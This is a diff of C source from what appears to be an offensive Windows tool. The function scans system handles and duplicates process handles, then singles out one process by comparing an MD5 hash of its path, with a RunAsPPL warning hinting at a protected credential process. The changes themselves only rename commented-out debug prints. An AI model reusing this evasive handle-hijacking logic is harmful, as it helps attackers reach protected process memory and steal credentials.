@@ -30,9 +30,9 @@ HANDLE AXIOM_HDuplicate()
         else
             break;
     }
-    //printf("[DEBUG] QuerySysInfo success\n");
+    //DEBUG_LOG("[DEBUG] QuerySysInfo success\n");
 
-    //printf("[DEBUG] Looping through all system handles\n");
+    //DEBUG_LOG("[DEBUG] Looping through all system handles\n");
     for (int i = 0; i < handleTableInformation->NumberOfHandles; i++)
     {
         CLIENT_ID clientId;
@@ -103,7 +103,7 @@ HANDLE AXIOM_HDuplicate()
                     TCHAR buffer[MAX_PATH];
                     DWORD bufferSize = MAX_PATH;
 
-                    //printf("[DEBUG] Handle opened towards a Process object: ");
+                    //DEBUG_LOG("[DEBUG] Handle opened towards a Process object: ");
                     if (QueryFullProcessImageName(hDuplicate, 0, buffer, &bufferSize))
                     {
                         // Identify the process based on DrunkHash of its path name
@@ -111,10 +111,10 @@ HANDLE AXIOM_HDuplicate()
                         char* c_buffer;
 
                         c_buffer = (char*)drunk_wchar_to_cstring(buffer);
-                        //printf("%s\n", c_buffer);
+                        //DEBUG_LOG("%s\n", c_buffer);
                         if (drunk_strcmp((const char*)drunk_md5(c_buffer), "bde503488303910db4ef6774fe16d6d7") == 0)
                         {
-                            //printf("[DEBUG] Duplicated HANDLE pointer: 0x%p\n", hDuplicate);
+                            //DEBUG_LOG("[DEBUG] Duplicated HANDLE pointer: 0x%p\n", hDuplicate);
                             memset(c_buffer, 0, strlen(c_buffer));
                             free((void*)c_buffer);
                             return (hDuplicate);
@@ -127,7 +127,7 @@ HANDLE AXIOM_HDuplicate()
                     }
                 }
             }
-            //printf("[WARNING] PROC_ALL_ACCESS denied (RunAsPPL ?)\n");
+            //DEBUG_LOG("[WARNING] PROC_VM_READ denied (RunAsPPL ?)\n");
         }
     }
     return (NULL);
